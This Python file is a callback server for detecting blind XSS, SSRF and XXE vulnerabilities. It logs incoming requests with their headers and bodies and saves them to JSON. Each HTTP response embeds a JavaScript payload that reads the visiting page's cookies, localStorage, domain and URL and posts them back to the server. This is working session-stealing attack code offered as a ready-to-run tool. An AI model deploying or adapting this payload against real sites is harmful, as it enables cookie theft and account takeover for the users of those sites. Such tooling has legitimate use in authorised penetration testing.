#!/usr/bin/env python3
"""
Callback/Webhook Server for Blind Vulnerability Detection
Receives callbacks from blind XSS, SSRF, XXE, etc.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import argparse
from datetime import datetime
from colorama import Fore, Style, init
import threading
import os

init(autoreset=True)


class CallbackHandler(BaseHTTPRequestHandler):
    """HTTP request handler for callbacks"""
    
    # Store callbacks in class variable
    callbacks = []
    
    def log_message(self, format, *args):
        """Override to customize logging"""
        pass
    
    def do_GET(self):
        """Handle GET requests"""
        self._handle_request('GET')
    
    def do_POST(self):
        """Handle POST requests"""
        self._handle_request('POST')
    
    def _handle_request(self, method):
        """Handle incoming callback"""
        timestamp = datetime.now().isoformat()
        
        # Get request details
        callback_data = {
            'timestamp': timestamp,
            'method': method,
            'path': self.path,
            'headers': dict(self.headers),
            'client_ip': self.client_address[0],
            'client_port': self.client_address[1]
        }
        
        # Get POST data if available
        if method == 'POST':
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
                callback_data['post_data'] = post_data
        
        # Store callback
        CallbackHandler.callbacks.append(callback_data)
        
        # Print callback notification
        print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[!] CALLBACK RECEIVED!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Time:{Style.RESET_ALL} {timestamp}")
        print(f"{Fore.CYAN}Method:{Style.RESET_ALL} {method}")
        print(f"{Fore.CYAN}Path:{Style.RESET_ALL} {self.path}")
        print(f"{Fore.CYAN}Client:{Style.RESET_ALL} {self.client_address[0]}:{self.client_address[1]}")
        print(f"{Fore.CYAN}User-Agent:{Style.RESET_ALL} {self.headers.get('User-Agent', 'N/A')}")
        
        if 'post_data' in callback_data:
            print(f"{Fore.CYAN}POST Data:{Style.RESET_ALL} {callback_data['post_data'][:200]}")
        
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}\n")
        
        # Send response
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        # Send JavaScript payload for XSS callbacks
        response = '''
        <html>
        <head><title>Callback Received</title></head>
        <body>
        <h1>Callback Received</h1>
        <script>
            // Collect additional info for XSS callbacks
            var info = {
                url: window.location.href,
                domain: document.domain,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                origin: window.origin,
                referrer: document.referrer
            };
            
            // Send info back
            fetch('/callback-data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(info)
            });
        </script>
        </body>
        </html>
        '''
        self.wfile.write(response.encode())


class CallbackServer:
    """Callback server manager"""
    
    def __init__(self, host='0.0.0.0', port=8080, output_dir='results'):
        """
        Initialize callback server
        
        Args:
            host: Host to bind to
            port: Port to listen on
            output_dir: Directory to save callbacks
        """
        self.host = host
        self.port = port
        self.output_dir = output_dir
        self.server = None
        self.server_thread = None
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
    
    def start(self):
        """Start the callback server"""
        self.server = HTTPServer((self.host, self.port), CallbackHandler)
        
        print(f"{Fore.CYAN}╔═══════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║        Callback/Webhook Server Started       ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚═══════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        print(f"{Fore.GREEN}[+] Server listening on {self.host}:{self.port}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Callback URL: http://{self.get_public_ip()}:{self.port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Waiting for callbacks... (Press Ctrl+C to stop){Style.RESET_ALL}\n")
        
        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Shutting down server...{Style.RESET_ALL}")
            self.stop()
    
    def start_background(self):
        """Start server in background thread"""
        self.server_thread = threading.Thread(target=self.start, daemon=True)
        self.server_thread.start()
    
    def stop(self):
        """Stop the callback server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
        
        # Save callbacks to file
        if CallbackHandler.callbacks:
            self.save_callbacks()
    
    def save_callbacks(self):
        """Save received callbacks to JSON file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{self.output_dir}/callbacks_{timestamp}.json"
        
        data = {
            'total_callbacks': len(CallbackHandler.callbacks),
            'callbacks': CallbackHandler.callbacks
        }
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Saved {len(CallbackHandler.callbacks)} callbacks to: {filename}{Style.RESET_ALL}")
    
    def get_public_ip(self):
        """Get public IP address"""
        try:
            import socket
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return self.host
    
    def get_callback_url(self):
        """Get the callback URL"""
        return f"http://{self.get_public_ip()}:{self.port}"
    
    def print_summary(self):
        """Print callback summary"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Callback Summary{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        if CallbackHandler.callbacks:
            print(f"{Fore.GREEN}[+] Received {len(CallbackHandler.callbacks)} callback(s){Style.RESET_ALL}\n")
            
            for i, callback in enumerate(CallbackHandler.callbacks, 1):
                print(f"{Fore.GREEN}Callback #{i}:{Style.RESET_ALL}")
                print(f"  Time: {callback['timestamp']}")
                print(f"  Method: {callback['method']}")
                print(f"  Path: {callback['path']}")
                print(f"  Client: {callback['client_ip']}")
                print(f"  User-Agent: {callback['headers'].get('User-Agent', 'N/A')}")
                print()
        else:
            print(f"{Fore.YELLOW}[-] No callbacks received{Style.RESET_ALL}")


def main():
    """Main function for CLI usage"""
    parser = argparse.ArgumentParser(description='Callback/Webhook Server for Blind Vulnerability Detection')
    parser.add_argument('-H', '--host', default='0.0.0.0', help='Host to bind to (default: 0.0.0.0)')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Port to listen on (default: 8080)')
    parser.add_argument('-o', '--output', default='results', help='Output directory for callbacks')
    
    args = parser.parse_args()
    
    server = CallbackServer(host=args.host, port=args.port, output_dir=args.output)
    
    try:
        server.start()
    except KeyboardInterrupt:
        server.print_summary()


if __name__ == '__main__':
    main()
